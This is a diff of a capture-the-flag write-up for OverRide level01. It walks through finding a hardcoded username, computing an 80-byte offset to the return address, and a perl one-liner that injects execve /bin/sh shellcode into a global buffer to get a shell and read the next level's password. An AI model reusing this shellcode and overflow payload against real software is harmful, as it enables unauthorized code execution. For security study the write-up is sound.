@@ -1,5 +1,8 @@
 # level01
 
+The program reads username and password from stdin and always prints incorrect password.
+
+## Step 1 Find the right username and password
 ```
 level01@OverRide:~$ gdb -batch -ex "x/s 0x80486a8" level01
 0x80486a8:	 "dat_wil"
@@ -20,6 +23,7 @@ nope, incorrect password...
 ```
 The username is correct, but we couldn't login.
 
+## Step 2 Calculate the offset to overwrite `eip`
 ```
    0x080484d8 <+8>:		sub    esp,0x60
    [...]
@@ -32,21 +36,23 @@ The username is correct, but we couldn't login.
 
 bottom of                                                            top of
 memory                                                               memory
-         esp+0x1c     esp+0x60
-<------     [   buffer   ][ padding ][ ebp ][ return addr ]
-                64 + 4         8        4          4
+         esp+0x1c          esp+0x60
+<------     [ local variables ][ padding ][ ebp ][ return addr ]
+                  64 + 4            8        4          4
 top of                                                            bottom of
 stack                                                                 stack
 ```
-The binary stores user password to a buffer which begins at esp+0x1c, so we need `0x60 - 0x1c + 0x8 + 0x4 = 0x50 (80)` to reach the return address.
+The username buffer is a global variable, we cannot use it to overwrite eip. According to disassembly, the binary stores password to a buffer which begins at esp+0x1c, so we need `0x60 - 0x1c + 0x8 + 0x4 = 0x50 (80)` to reach the return address.
 
+## Step 3 Find a place to inject shellcode
 ```
 level01@OverRide:~$ objdump -j .bss -d level01
 [...]
 0804a040 <a_user_name>:
 ```
-`0x0804a040` is the address of global variable `a_user_name` which stores input username, we concatenate [shellcode](http://shell-storm.org/shellcode/files/shellcode-219.php) after the username `dat_wil` then use the address to access it.
+`0x0804a040` is the address of global variable `a_user_name` which stores input username, we concatenate [shellcode](http://shell-storm.org/shellcode/files/shellcode-219.php) after the username `dat_wil` then use the address `0x0804a040 + 0x7` to access it.
 
+## Step 4 Build the payload
 ```
 level01@OverRide:~$ perl -e 'print "dat_wil\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\n" . "A"x80 . pack("V", 0x804a047)' | ./level01
 ********* ADMIN LOGIN PROMPT *********
@@ -60,4 +66,3 @@ level02
 $ cat /home/users/$(whoami)/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 ```
-We replaced return address with `0x804a047` because we need to skip the username `dat_wil` which contains 7 bytes.
